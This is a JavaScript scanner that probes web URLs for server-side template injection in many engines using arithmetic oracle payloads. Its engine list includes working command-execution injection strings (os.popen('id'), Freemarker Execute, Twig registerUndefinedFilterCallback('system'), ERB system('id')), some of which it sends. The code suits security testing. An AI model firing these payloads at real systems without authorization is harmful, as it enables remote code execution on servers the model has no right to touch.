// templateinject.js — SSTI probe for multiple template engines.
// Copyright (c) 2026 0xnothings
// @tool templateinject
// @desc Server-side template injection probe using math-expression oracles for Jinja2, Twig, Freemarker, Velocity, Thymeleaf, Handlebars, ERB and more
// @usage node tools/templateinject.js "https://target/search?q=FUZZ" --json
// @tags security,web,injection,ssti
import { args, get, num, flag, die, inputLines, table } from '../_lib.js';

const o = args(process.argv.slice(2));
if (o.f.help) {
  console.log(`templateinject — SSTI probe with math oracles

  node tools/templateinject.js <url-with-FUZZ|list.txt|-> [options]

  Put FUZZ where the payload goes. Without FUZZ the tool appends ?q=<payload>.

  --method <m>     HTTP method (default: GET)
  --body <tmpl>    POST body template containing FUZZ (implies POST body mode)
  --header <h>     also try each payload in this header (e.g. User-Agent)
  --timeout <ms>   per-request timeout (default: 8000)
  --delay <ms>     delay between requests (default: 100)
  --engines <list> comma list to restrict engines (default: all)
  --list           list engines and their oracles
  --json           machine-readable output
  -h, --help       this text

  Oracle: unique arithmetic results (e.g. 49*87=4263) must appear in the
  response. Reflection of the raw payload alone is reported as INCONCLUSIVE.`);
  process.exit(0);
}

// process.exit() after a fetch deadlocks libuv on Windows; halting via a thrown
// sentinel keeps the exit code intact without tripping the async handle assert.
class ExitSignal extends Error { constructor() { super('exit-signal'); this.__exitSignal = true; } }
const __exitGuard = (e) => { if (!e || !e.__exitSignal) { process.stderr.write(String(e && e.stack || e) + '\n'); process.exitCode = 1; } };
process.on('uncaughtException', __exitGuard);
process.on('unhandledRejection', __exitGuard);
const exitSoon = (code = 0) => { process.exitCode = code; throw new ExitSignal(); };
const timeout = num(get(o, 'timeout'), 8000);
const delay = num(get(o, 'delay'), 100);
const method = String(get(o, 'method', 'GET')).toUpperCase();
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// Unique arithmetic identifier: 4871 * 23 = 112033 — unlikely to occur naturally.
const A = 4871, B = 23, PRODUCT = String(A * B); // 112033
const SUM = String(A + B);                          // 4894

const ENGINES = [
  { id: 'jinja2', lang: 'python', test: `{{${A}*${B}}}`, alt: [`{{ ${A}*${B} }}`, `{%print(${A}*${B})%}`], rce: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` },
  { id: 'tornado', lang: 'python', test: `{{${A}*${B}}}`, alt: [`{% import os %}{{os.popen('id').read()}}`] },
  { id: 'django', lang: 'python', test: `{{${A}|add:"${B}"}}`, alt: [`{% debug %}`] },
  { id: 'mako', lang: 'python', test: `\${${A}*${B}}`, alt: [`\${self.module.cache.util.os.popen('id').read()}`] },
  { id: 'twig', lang: 'php', test: `{{${A}*${B}}}`, alt: [`{{${A}*${B}}}`], rce: `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}` },
  { id: 'smarty', lang: 'php', test: `{${A}*${B}}`, alt: [`{if ${A}*${B}}smarty_ok{/if}`] },
  { id: 'freemarker', lang: 'java', test: `\${${A}*${B}}`, alt: [`#{${A}*${B}}`, `\${${A}+${B}}`], rce: `<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}` },
  { id: 'velocity', lang: 'java', test: `#set($x=${A}*${B})\${x}`, alt: [`\${${A}*${B}}`] },
  { id: 'thymeleaf', lang: 'java', test: `[[\${${A}*${B}}]]`, alt: [`th:with="x=\${${A}*${B}}"`, `__\${${A}*${B}}__`] },
  { id: 'groovy', lang: 'java', test: `\${${A}*${B}}`, alt: [`<%= ${A}*${B} %>`] },
  { id: 'handlebars', lang: 'js', test: `{{#with "s" as |string|}}${A}{{/with}}`, alt: [`{{${A}}}`, `{{multiply ${A} ${B}}}`] },
  { id: 'nunjucks', lang: 'js', test: `{{${A}*${B}}}`, alt: [`{{range(0,${A})|length}}`] },
  { id: 'ejs', lang: 'js', test: `<%= ${A}*${B} %>`, alt: [`<%- ${A}*${B} %>`] },
  { id: 'erb', lang: 'ruby', test: `<%= ${A}*${B} %>`, alt: [`<%= ${A}*${B} %>`], rce: `<%= system("id") %>` },
  { id: 'slim', lang: 'ruby', test: `#{${A}*${B}}`, alt: [] },
  { id: 'liquid', lang: 'ruby', test: `{{ ${A} | times: ${B} }}`, alt: [`{{${A}*${B}}}`] },
  { id: 'mustache', lang: 'multi', test: `{{${A}*${B}}}`, alt: [] },
  { id: 'pebble', lang: 'java', test: `{{${A}*${B}}}`, alt: [`{{ ${A} * ${B} }}`] },
  { id: 'jade', lang: 'js', test: `#{${A}*${B}}`, alt: [`= ${A}*${B}`] },
  { id: 'dotliquid', lang: 'dotnet', test: `{{${A}|Times:${B}}}`, alt: [] },
  { id: 'razor', lang: 'dotnet', test: `@{var x=${A}*${B};}@x`, alt: [] },
];

if (flag(o, 'list')) {
  console.log(table(ENGINES.map((e) => ({ engine: e.id, language: e.lang, oracle: e.test, alternates: e.alt.length }))));
  exitSoon(0);
}

const want = String(get(o, 'engines', 'all')).toLowerCase();
const engines = want === 'all' ? ENGINES : ENGINES.filter((e) => want.split(',').map((s) => s.trim()).includes(e.id));
if (!engines.length) die('no matching engines — run with --list');

async function send(url, opts) {
  const ctl = new AbortController();
  const t = setTimeout(() => ctl.abort(), timeout);
  try {
    const r = await fetch(url, { ...opts, signal: ctl.signal, redirect: 'manual' });
    const body = await r.text();
    return { status: r.status, body: body.slice(0, 20000), len: body.length, error: null };
  } catch (e) {
    return { status: 0, body: '', len: 0, error: e.name === 'AbortError' ? 'timeout' : (e.message || 'failed') };
  } finally { clearTimeout(t); }
}

async function probe(entry, payload, mode, url) {
  const headers = { 'user-agent': 'templateinject/1.0' };
  let target = url, init;
  if (mode === 'header') {
    headers[entry] = payload;
    init = { method, headers };
  } else if (mode === 'body') {
    headers['content-type'] = String(get(o, 'content-type', 'application/x-www-form-urlencoded'));
    init = { method: 'POST', headers, body: String(get(o, 'body', 'q=FUZZ')).replace(/FUZZ/g, encodeURIComponent(payload)) };
  } else {
    target = url.includes('FUZZ') ? url.replace(/FUZZ/g, encodeURIComponent(payload)) : `${url}${url.includes('?') ? '&' : '?'}q=${encodeURIComponent(payload)}`;
    init = { method: 'GET', headers };
  }
  return { ...(await send(target, init)), url: target };
}

let entries = o._.length ? o._ : ['-'];
let urls = [];
for (const e of entries) {
  if (e === '-' || /\.txt$/.test(e)) urls.push(...(await inputLines(e)));
  else urls.push(e);
}
urls = [...new Set(urls.filter(Boolean))];
if (!urls.length) die('no URL given; pass a URL containing FUZZ');

const results = [];
for (const url of urls) {
  const baseRes = await send(url.includes('FUZZ') ? url.replace(/FUZZ/g, 'baselinezz') : url, { method, headers: { 'user-agent': 'templateinject/1.0' } });
  const baselineHadProduct = new RegExp(`\\b${PRODUCT}\\b`).test(baseRes.body);
  await sleep(delay);

  const modes = [];
  if (o.f.body) modes.push(['body', 'body']);
  if (o.f.header) modes.push(['header', String(o.f.header)]);
  if (!modes.length) modes.push(['query', null]);

  const tests = [];
  for (const [mode, target] of modes) {
    for (const eng of engines) {
      const payloads = [eng.test, ...(eng.alt || [])];
      for (const p of payloads) {
        const res = await probe(target, p, mode, url);
        const ev = [];
        let verdict = null;
        const hasProduct = res.body.includes(PRODUCT);
        const reflected = res.body.includes(p) || res.body.includes(p.replace(/\\/g, ''));
        if (hasProduct && !baselineHadProduct) {
          ev.push(`arithmetic oracle matched: ${A}*${B} = ${PRODUCT} rendered by the engine`);
          if (res.body.includes(SUM) && !new RegExp(`\\b${SUM}\\b`).test(baseRes.body)) ev.push(`plus oracle matched: ${A}+${B} = ${SUM}`);
          verdict = 'CRITICAL';
        } else if (reflected) {
          ev.push('payload reflected verbatim — inconclusive, likely no evaluation');
          verdict = 'INCONCLUSIVE';
        } else if (res.status !== baseRes.status) {
          ev.push(`status changed ${baseRes.status} -> ${res.status}`);
          verdict = 'LOW';
        }
        tests.push({
          mode, engine: eng.id, language: eng.lang, payload: p, status: res.status,
          bytes: res.len, verdict, evidence: ev, error: res.error || null, url: res.url,
          sample: res.body.includes(PRODUCT) ? res.body.slice(Math.max(0, res.body.indexOf(PRODUCT) - 60), res.body.indexOf(PRODUCT) + 60) : '',
        });
        await sleep(delay);
      }
    }
  }
  const findings = tests.filter((t) => t.verdict === 'CRITICAL' || t.verdict === 'HIGH');
  results.push({ url, method, baseline: { status: baseRes.status, bytes: baseRes.len, had_oracle: baselineHadProduct }, tests, findings });
}

if (flag(o, 'json')) {
  const any = results.some((r) => r.findings.length);
  console.log(JSON.stringify({ generated: new Date().toISOString(), oracle: { product: PRODUCT, sum: SUM }, results }, null, 2));
  exitSoon(any ? 1 : 0);
}

for (const r of results) {
  console.log(`\n### ${r.url}`);
  console.log(`baseline: status ${r.baseline.status}, ${r.baseline.bytes} bytes, oracle in baseline: ${r.baseline.had_oracle}`);
  const crit = r.tests.filter((t) => t.verdict === 'CRITICAL');
  const low = r.tests.filter((t) => t.verdict && t.verdict !== 'CRITICAL');
  console.log(table(r.tests.slice(0, 40).map((t) => ({
    mode: t.mode, engine: t.engine, lang: t.language, payload: t.payload.slice(0, 26),
    status: t.status, verdict: t.verdict || '-', evidence: (t.evidence[0] || '').slice(0, 42),
  }))));
  if (crit.length) {
    console.log(`\n*** SSTI CONFIRMED (${crit.length}) ***`);
    for (const c of crit) {
      console.log(`  engine=${c.engine} (${c.language}) mode=${c.mode}`);
      console.log(`  payload: ${c.payload}`);
      console.log(`  proof  : ${c.evidence.join('; ')}`);
      console.log(`  excerpt: ${c.sample}`);
    }
  } else {
    console.log(`\nno engine evaluated the oracle payload (${low.length} low-signal response difference(s))`);
  }
}
exitSoon(results.some((r) => r.findings.length) ? 1 : 0);
